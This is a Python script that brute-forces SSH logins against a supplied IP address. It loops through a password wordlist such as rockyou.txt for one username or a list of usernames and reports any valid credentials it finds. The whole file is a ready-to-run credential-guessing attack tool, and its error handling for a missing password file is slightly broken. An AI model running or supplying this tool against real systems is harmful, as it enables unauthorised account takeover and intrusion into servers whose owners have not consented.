#!/usr/bin/python3

from pwn import *
import paramiko
from colored import *
import ipaddress

# Decorations
greenPlus 	= f"{fg('green')}[+]{attr('reset')}"
redMinus 	= f"{fg('red')}[-]{attr('reset')}"
purpleStar	= f"{fg('purple_4a')}[*]{attr('reset')}"
red = lambda s: f"{fg('red')}{s}{attr('reset')}"

# It takes username and password.
def BruteForce(usr, password_list):
	attempts = 1
	for pwd in password_list:
		pwd = pwd.strip("\n")
		try:
			print(f"{purpleStar} [{attempts}] Attempting password: {pwd}...")
			response = ssh(host=host, user=usr, password=pwd, timeout=3)
			if response.connected():
				print(f"{greenPlus} Valid credential found: {red(usr)}:{red(pwd)}.")
				response.close()
				break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
			print(f"{redMinus} Invalid password")
		except FileNotFoundError:
			print(f"{greenPlus} The credential seems valid, but the user has no home directory.\n" \
				  f"{greenPlus} Try logging into the target manually with {red(usr)}:{red(pwd)}.")
			break
		attempts += 1

# Main
if __name__ == "__main__":
	# Variables
	prompt = ""

	# Checking the required number of arguments
	if len(sys.argv) != 4:
		print(f"{sys.argv[0]} usage: python3 {sys.argv[0]} host username password_list")
		print(f"{purpleStar} Example: python3 {sys.argv[0]} 127.0.0.1 root /usr/share/wordlists/rockyou.txt")
		print(f"{purpleStar} A single user name or a wordlist of user names may be supplied.")
		print(f"{purpleStar} Password_list must be a wordlist.")
		exit()
	else:
		# Valid IP address check for host
		try:
			ipaddress.ip_address(sys.argv[1])
		except ValueError:
			print(f"{redMinus} Please provide a valid IP address.")
			exit()
		host = sys.argv[1]
		# File checks
		try:
			username = open(sys.argv[2], "r")
			print(f"{greenPlus} The supplied wordlist of user {red(username.name)} will be used.")
		except FileNotFoundError:
			username = sys.argv[2]
			print(f"{redMinus} The supplied wordlist {red(username)} does not exist.")
			print(f"{greenPlus} The supplied user name {red(username)} will be used as a user name.")
		try:
			password_list = open(sys.argv[3], "r")
			print(f"{greenPlus} The supplied password wordlist {red(password_list.name)} will be used.")
		except FileNotFoundError:
			print(f"{redMinus} The supplied password wordlist {red(password_list.name)} cannot be found.")
			exit()

	# Confirmation
	while prompt != "y":
		print(f"Current Setup\n" \
				f"Host: {host}\n" \
				f"User name or wordlist: {username}\n" \
				f"Password wordlist: {password_list.name}")
		prompt = input("Proceed? (y/n): ")
		prompt = prompt.rstrip("\n")
		if prompt == "n":
			print(f"{redMinus} Quitting!")
			exit()

	# Checking to use a username or a wordlist for user names.
	if isinstance(username,str):
		BruteForce(username, password_list)
	else:
		for usr in username:
			usr = usr.strip("\n")
			print(f"{purpleStar} Using {red(usr)} as the user name...")
			BruteForce(usr, password_list)
			password_list.seek(0)